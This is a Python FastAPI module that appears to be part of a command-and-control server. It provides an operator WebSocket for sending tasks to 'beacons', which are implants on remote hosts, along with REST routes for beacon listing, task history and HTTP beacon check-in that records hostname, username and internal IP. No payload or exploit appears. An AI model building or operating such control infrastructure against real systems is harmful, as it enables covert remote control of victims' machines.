"""
AngelaMos | 2026
router.py

Operator interface combining a WebSocket dashboard channel and REST beacon routes

The /ws/operator WebSocket sends the current beacon list on connect
and accepts submit_task messages from the operator. Three REST routes
cover beacon listing, single-beacon lookup, and task history. All
handlers share the registry, task manager, and ops manager from
app.state.

Key exports:
ws_router - WebSocket router mounted at /ws/operator
rest_router - REST routes for /beacons and /beacons/{id}

Connects to:
beacon/registry.py - reads beacon list and active status
beacon/tasking.py - submits tasks and fetches history
core/models.py - uses CommandType, TaskRecord
database.py - calls get_db()
ops/manager.py - manages operator connections
"""

import json
import logging
import uuid
from typing import Any

from fastapi import APIRouter, HTTPException, Request, WebSocket, WebSocketDisconnect

from app.beacon.registry import BeaconRegistry
from app.beacon.tasking import TaskManager
from app.config import settings
from app.core.models import BeaconMeta, CommandType, TaskRecord
from app.database import get_db
from app.ops.manager import OpsManager
from pydantic import BaseModel, Field, ConfigDict

logger = logging.getLogger(__name__)

ws_router = APIRouter()
rest_router = APIRouter()


@ws_router.websocket("/operator")
async def operator_websocket(ws: WebSocket) -> None:
    """
    WebSocket endpoint for operator dashboard connections with authentication and role tracking
    """
    ops_manager: OpsManager = ws.app.state.ops_manager
    registry: BeaconRegistry = ws.app.state.registry
    task_manager: TaskManager = ws.app.state.task_manager

    # 1. Manually accept the WebSocket connection to begin auth handshake
    await ws.accept()

    # 2. Authenticate the operator and extract role before registering connection
    try:
        raw_auth = await ws.receive_text()
        auth_data = json.loads(raw_auth)

        if auth_data.get("type") != "auth" or auth_data.get("key") != settings.AUTH_KEY:
            logger.warning("Unauthorized operator connection attempt")
            await ws.close(code=4001, reason="Unauthorized")
            return

        role = auth_data.get("role", "admin")
    except Exception as e:
        logger.warning("Auth handshake failed: %s", e)
        await ws.close(code=4001, reason="Unauthorized")
        return

    # 3. Register authenticated connection with manager including role
    await ops_manager.connect(ws, role)

    try:
        # Send initial beacon snapshot
        async with get_db() as db:
            beacons = await registry.get_all(db)

            beacon_list = []
            for b in beacons:
                record = b.model_dump()
                record["active"] = registry.is_active(b.id)
                beacon_list.append(record)

            await ws.send_text(
                json.dumps({
                    "type": "beacon_list",
                    "payload": beacon_list,
                })
            )

        # 4. Process incoming operator actions
        while True:
            raw = await ws.receive_text()
            data = json.loads(raw)

            if data.get("type") == "submit_task":
                if ops_manager.get_role(ws) == "viewer":
                    await ws.send_text(
                        json.dumps({
                            "type": "error",
                            "payload": {"message": "Unauthorized: viewers cannot submit tasks"},
                        })
                    )
                    continue

                payload = data["payload"]
                task = TaskRecord(
                    id=str(uuid.uuid4()),
                    beacon_id=payload["beacon_id"],
                    command=CommandType(payload["command"]),
                    args=payload.get("args"),
                )

                async with get_db() as db:
                    await task_manager.submit(task, db)
                    await ws.send_text(
                    json.dumps({
                        "type": "task_submitted",
                        "payload": {
                            "local_id": payload.get("local_id"),
                            "task_id": task.id,
                        },
                    })
                )

                logger.info(
                    "Task %s (%s) submitted for beacon %s",
                    task.id,
                    task.command,
                    task.beacon_id,
                )

    except WebSocketDisconnect:
        pass
    except json.JSONDecodeError:
        logger.warning("Invalid JSON from operator")
    finally:
        ops_manager.disconnect(ws)


@rest_router.get("/beacons")
async def list_beacons(request: Request) -> list[dict[str, Any]]:
    """
    List all known beacons with active connection status
    """
    registry: BeaconRegistry = request.app.state.registry
    async with get_db() as db:
        beacons = await registry.get_all(db)

        result = []
        for b in beacons:
            record = b.model_dump()
            record["active"] = registry.is_active(b.id)
            result.append(record)
        return result


@rest_router.get("/beacons/{beacon_id}")
async def get_beacon(request: Request, beacon_id: str) -> dict[str, Any]:
    """
    Retrieve a single beacon by ID with active status
    """
    registry: BeaconRegistry = request.app.state.registry
    async with get_db() as db:
        beacon = await registry.get_one(beacon_id, db)

        if beacon is None:
            raise HTTPException(status_code=404, detail="Beacon not found")

        record = beacon.model_dump()
        record["active"] = registry.is_active(beacon_id)
        return record


@rest_router.get("/beacons/{beacon_id}/tasks")
async def beacon_task_history(request: Request, beacon_id: str) -> list[dict[str, str | None]]:
    """
    Retrieve task history with results for a specific beacon
    """
    task_manager: TaskManager = request.app.state.task_manager
    async with get_db() as db:
        return await task_manager.get_history(beacon_id, db)


@rest_router.get("/operators/count")
async def get_operator_count(request: Request):
    ops_manager = request.app.state.ops_manager
    return {"count": ops_manager.connection_count}






class BeaconRegisterSchema(BaseModel):
    model_config = ConfigDict(extra="allow")  # Ignores extra fields instead of throwing 422
    
    id: str | None = None
    session_id: str | None = None
    hostname: str | None = "unknown"
    os: str | None = "unknown"
    transport: str | None = "unknown"


@rest_router.post("/beacons/register")
async def register_beacon_http(request: Request, data: BeaconRegisterSchema) -> dict[str, Any]:
    """
    HTTP endpoint to register or check-in a beacon
    """
    beacon_registry = request.app.state.registry
    ops_manager: OpsManager = request.app.state.ops_manager
    
    beacon_id = data.id or data.session_id or str(uuid.uuid4())
    hostname = data.hostname or "unknown"
    os_type = data.os or "unknown"
    transport = data.transport or "unknown"
    
    async with get_db() as db:
        # Pass default fallback values for fields that BeaconMeta expects
        meta = BeaconMeta(
            hostname=hostname,
            os=os_type,
            transport=transport,
            username=getattr(data, "username", "root"),
            pid=getattr(data, "pid", 0),
            internal_ip=getattr(data, "internal_ip", "127.0.0.1"),
            arch=getattr(data, "arch", "x86_64")
        )
        await beacon_registry.register(beacon_id=beacon_id, meta=meta, ws=None, db=db)
        
    logger.info("HTTP Beacon registered/checked in: %s", beacon_id)
    
    if hasattr(ops_manager, "broadcast"):
        await ops_manager.broadcast({
            "type": "beacon_connected",
            "payload": {
                "id": beacon_id,
                "hostname": hostname,
                "os": os_type,
                "transport": transport,
                "active": True
            }
        })
        
    return {"status": "success", "id": beacon_id}